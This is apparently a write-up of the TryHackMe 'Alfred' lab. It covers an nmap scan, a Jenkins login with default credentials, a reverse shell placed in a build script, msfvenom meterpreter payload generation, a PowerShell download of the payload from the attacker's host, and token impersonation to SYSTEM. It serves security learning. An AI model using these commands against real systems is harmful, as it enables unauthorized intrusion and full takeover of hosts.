<p align="center">
  THM : Alfred<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/alfred<br>
  <img src="https://i.imgur.com/qHciVYu.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Port 8080](#port-8080)
- [Switching shell](#switching-shell)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's use [nmap](https://nmap.org/) to run an agressive port scan against the target :  
```
# Nmap 7.80 scan initiated Tue Oct 25 23:29:03 2022 as: nmap -A -p- -oN nmapResults.txt 10.10.226.91
Nmap scan report for 10.10.226.91
Host is up (0.034s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 25 23:32:13 2022 -- 1 IP address (1 host up) scanned in 189.85 seconds
```

There is two interesting open ports :  
- port 80 -> there is a website on this host
- port 8080 -> "Jetty provides a web server and servlet container".

**Question : How many ports are open ? (TCP only)**  
**Answer : 3**  

## Port 8080

Let's take a look at port 8080 using a web browser :  
![](https://i.imgur.com/Wiytf1z.jpg)  

This is the login panel for Jenkins. Jenkins is an open source automation server. It helps automate the parts of software development related to 
building, testing, and deploying, facilitating continuous integration and continuous delivery. The first thing to try when pentesting a login panel is default 
credentials. Let's search what are default credentials for jenkins :  
![](https://i.imgur.com/x0Qcatr.jpg)  

We only have the default username which is `admin`. Let's try to also use `admin` as password :  
![](https://i.imgur.com/djCE1DB.jpg)  

It worked ! We successfully logged in to the Jenkins panel.  

**Question : What is the username and password for the log in panel(in the format username:password)**  
**Answer : admin:admin**  

When we go to project configuration, we can edit the build script command :  
![](https://i.imgur.com/3qaySIg.jpg)  

We can put a reverse shell in here. We know it's a windows host so let's try to use a Powershell reverse shell. First, let's start a netcat listener :  
```
attacker@AttackBox:~/Documents/THM/CTF/Alfred$ nc -lnvp 4444
listening on [any] 4444 ...
```

Now, let's change the build script command by writing a Powershell reverse shell :  
![](https://i.imgur.com/Qhm0iAT.jpg)  

Let's apply this settings, start a build, and see if we have a connection on our netcat listener :  
```
attacker@AttackBox:~/Documents/THM/CTF/Alfred$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.14.32.60] from (UNKNOWN) [10.10.226.91] 49248
PS C:\Program Files (x86)\Jenkins\workspace\project> 
```

We have now a reverse shell on the target ! Let's get the user.txt flag :  
```
PS C:\> cd Users
PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            bruce                             
d----        10/25/2019  10:21 PM            DefaultAppPool                    
d-r--        11/21/2010   7:16 AM            Public                            


PS C:\Users> cd bruce
PS C:\Users\bruce> ls


    Directory: C:\Users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            


PS C:\Users\bruce> cd Desktop
PS C:\Users\bruce\Desktop> ls


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> cat user.txt
******************************
```

## Switching shell

It is asked to switch to a meterpreter reverse shell to make privilege escalation easier. First, let's generate a milious .exe file using msfvenom :  
```
attacker@AttackBox:~/Documents/THM/CTF/Alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 LHOST=tun0 LPORT=4445 -f exe -o meterpreter.exe
[?] Would you like to init the webservice? (Not Required) [no]: 
[?] Would you like to delete your existing data and configurations? []: no
Clearing http web data service credentials in msfconsole
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/attacker/.msf4/db...success
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: meterpreter.exe
```

Now, let's start a python web server on our machine and download the crafted exe file to the target :  
```
PS C:\Users\bruce\Desktop> $WebClient.DownloadFile("http://10.14.32.60/meterpreter.exe","C:/Users/bruce/Desktop/meterpreter.exe")
PS C:\Users\bruce\Desktop> ls


    Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2022  11:18 PM      73802 meterpreter.exe                   
-a---        10/25/2019  11:22 PM         32 user.txt
```

Now, let's start a listener on our machine using msfconsole and then execute the exe file we downloaded to the target :  
```
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.14.32.60:4445 
[*] Sending stage (175686 bytes) to 10.10.226.91
[*] Meterpreter session 1 opened (10.14.32.60:4445 -> 10.10.226.91:49269) at 2022-10-26 00:21:18 +0200

meterpreter >
```

We have now a meterpreter shell on the target.

**Question : What is the final size of the exe payload that you generated ?**  
**Answer : 73802**  

## Privilege escalation

Let's use `whoami /priv` to see what privileges we have :  
```
PS C:\Users\bruce\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------


Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

You can notice we have the privilege `SeImpersonatePrivilege` set to `Enabled`. We may be able to impersonate another user. Let's go back to our meterpreter shell 
and use `load incognito` to load the module we will use to impersonate other users. We can now list available tokens by using `list_tokens -g` :  
```
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\NlaSvc
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc
```

Now, we can use `impersonate_token "BUILTIN\Administrators"` :  
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

There is a last step to get full control on the machine. We need to migrate to a process running as `NT AUTHORIT\SYSTEM`. First, let's use `ps` to list running process :  
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 520   2532  meterpreter.exe       x86   0        alfred\bruce                  C:\Users\bruce\Desktop\meterpreter.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 920   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 940   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 988   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1012  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1208  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1236  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1340  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1424  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1448  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1476  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1596  1808  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 1636  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1704  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1808  1636  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1820  668   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1872  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1892  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1992  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2060  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2292  772   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2532  1596  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2636  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2676  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2996  668   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
```

Let's use `migrate 668` to migrate to process `services.exe` :  
```
meterpreter > migrate 668
[*] Migrating from 520 to 668...
[*] Migration completed successfully.
```

We are now running our shell as `NT AUTHORITY\SYSTEM` ! We have full control on the machine now.

**Question :  What is the output when you run the getuid command ?**  
**Answer : NT AUTHORITY\SYSTEM**  

Let's get the root flag in `C:\Windows\System32\config` :  
```
meterpreter > cd C:/Windows/System32/config
meterpreter > cat root.txt
******************************
```

## Conclusion

This room was useful for beginners to learn basic pentesting on windows hosts. Thanks for this room and thanks for reading my write ups !









